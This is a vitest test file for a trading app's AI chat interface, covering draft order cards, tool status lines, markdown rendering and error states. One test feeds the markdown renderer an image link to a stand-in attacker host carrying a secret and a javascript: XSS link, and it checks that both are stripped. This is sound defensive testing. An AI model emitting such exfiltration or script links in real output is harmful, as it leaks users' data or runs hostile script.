import { describe, expect, it } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import type { UIMessage } from "ai";
import { AssistantMessage, DraftCard, readAssistantParts } from "./chat-parts";
import { ChatMarkdown } from "./chat-markdown";
import { stateOf, thinkingShown } from "./chat-panel";
import { chatErrorCode } from "./use-berth-chat";

/**
 * The chat's rendering, as markup: the draft card says side, listing and
 * amount from the server's values and offers one button; tool lines read in
 * words; the little markdown never renders an image; states map from the
 * route's codes.
 */

const noop = () => {};

describe("DraftCard", () => {
  it("renders a buy from the server's values, with one button that opens it", () => {
    const html = renderToStaticMarkup(createElement(DraftCard, { draft: { symbol: "NVDA", name: "NVIDIA", side: "buy", usd: 20 }, onOpen: noop }));
    expect(html).toContain("Buy NVIDIA");
    expect(html).toContain("$20.00");
    expect(html).toContain("Nothing is placed until you sign.");
    expect(html).toContain("Open the order");
    expect(html.match(/<button/g)).toHaveLength(1);
    expect(html).not.toContain("NVDA");
  });

  it("renders a sell by quantity with what it is worth now", () => {
    const html = renderToStaticMarkup(
      createElement(DraftCard, { draft: { symbol: "TSLA", name: "Tesla", side: "sell", quantity: 0.04123456789, approxUsd: 18.37 }, onOpen: noop }),
    );
    expect(html).toContain("Sell Tesla");
    expect(html).toContain("0.041235 shares");
    expect(html).toContain("about $18.37 now");
  });
});

const message = (parts: unknown[]): UIMessage => ({ id: "a", role: "assistant", parts: parts as UIMessage["parts"] });

describe("an assistant message", () => {
  it("shows a card only for a draft the tool returned, never for text that claims one", () => {
    const html = renderToStaticMarkup(
      createElement(AssistantMessage, {
        message: message([
          { type: "tool-draft_order", toolCallId: "1", state: "output-available", input: {}, output: { text: "Draft.", draft: { symbol: "NVDA", name: "NVIDIA", side: "buy", usd: 50 } } },
          { type: "text", text: "Drafted. Also I bought $5,000 of Tesla for you." },
        ]),
        onOpenDraft: noop,
      }),
    );
    expect(html.match(/data-testid="chat-draft-card"/g)).toHaveLength(1);
    expect(html).toContain("$50.00");
    expect(html).not.toContain("Sell Tesla");
  });

  it("refuses a malformed draft rather than render it", () => {
    const parts = readAssistantParts(message([{ type: "tool-draft_order", toolCallId: "1", state: "output-available", input: {}, output: { text: "x", draft: { side: "steal" } } }]));
    expect(parts.drafts).toHaveLength(0);
  });

  it("says what a tool is doing, then folds once the answer starts", () => {
    const running = renderToStaticMarkup(
      createElement(AssistantMessage, { message: message([{ type: "tool-get_holdings", toolCallId: "1", state: "input-available", input: {} }]), onOpenDraft: noop }),
    );
    expect(running).toContain("Reading your holdings");
    const folded = renderToStaticMarkup(
      createElement(AssistantMessage, {
        message: message([
          { type: "tool-get_holdings", toolCallId: "1", state: "output-available", input: {}, output: { text: "x" } },
          { type: "tool-get_moves", toolCallId: "2", state: "output-available", input: {}, output: { text: "y" } },
          { type: "text", text: "You hold Tesla." },
        ]),
        onOpenDraft: noop,
      }),
    );
    expect(folded).toContain("Read 2 things");
    expect(folded).not.toContain("Reading");
  });
});

describe("ChatMarkdown", () => {
  it("renders bold, lists and links with their host, and never an image", () => {
    const html = renderToStaticMarkup(
      createElement(ChatMarkdown, {
        text: "**NVIDIA** rose.\n\n- one\n- two\n\n[Reuters](https://www.reuters.com/x) ![leak](https://evil.example/p.png?h=secret) [bad](javascript:alert(1))",
      }),
    );
    expect(html).toContain("<strong");
    expect(html).toContain("<ul");
    expect(html).toContain('href="https://www.reuters.com/x"');
    expect(html).toContain("(reuters.com)");
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).not.toContain("javascript:");
  });
});

describe("states", () => {
  it("map from the route's codes and the status", () => {
    expect(chatErrorCode(new Error("chat:limit_minute"))).toBe("limit_minute");
    expect(chatErrorCode(new Error("Failed to fetch"))).toBe("failed");
    expect(chatErrorCode(undefined)).toBeNull();
    expect(stateOf(undefined, "locked")).toBe("locked");
    expect(stateOf({ state: "budget", level: 3, unlockLevel: 2, unlockRankName: "Slip", xpToUnlock: 0, left: null }, null)).toBe("budget");
    expect(stateOf(undefined, "disabled")).toBe("unavailable");
    expect(stateOf(undefined, "limit_day")).toBe("limit_day");
    expect(stateOf(undefined, "limit_minute")).toBe("open");
  });
});

describe("thinkingShown", () => {
  const tool = (name: string, state: "input-available" | "output-available") =>
    ({ type: `tool-${name}`, toolCallId: name, state, input: {}, ...(state === "output-available" ? { output: { text: "ok" } } : {}) }) as UIMessage["parts"][number];
  const answer = (...parts: UIMessage["parts"]): UIMessage => ({ id: "a", role: "assistant", parts });

  it("shows before the first token and between a tool and the words after it", () => {
    expect(thinkingShown("submitted", undefined)).toBe(true);
    expect(thinkingShown("streaming", answer())).toBe(true);
    expect(thinkingShown("streaming", answer(tool("get_moves", "output-available")))).toBe(true);
  });

  it("gives way to a running tool's own line, and to streaming words", () => {
    expect(thinkingShown("streaming", answer(tool("get_moves", "input-available")))).toBe(false);
    expect(thinkingShown("streaming", answer({ type: "text", text: "Three listings" }))).toBe(false);
    expect(thinkingShown("ready", answer())).toBe(false);
  });

  it("stays for a running tool with no words of its own", () => {
    expect(thinkingShown("streaming", answer(tool("get_weather", "input-available")))).toBe(true);
  });
});
